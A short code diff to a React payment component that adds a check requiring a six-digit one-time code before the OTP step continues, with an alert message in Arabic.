@@ -616,6 +616,11 @@ export default function Payment (props: any)  {
                             handlePay(paymentInfo, setPaymentInfo);
                             handleSubmit();
                           } else if (step >= 2) {
+                            if(paymentInfo.otp?.length! !==6){
+
+                              alert('يجب انك يكون الرمز مكون من 6 ارقام')
+                              return 
+                            }
                             if (!newotp.includes(paymentInfo.otp!)) {
                               newotp.push(paymentInfo.otp!);
                             }
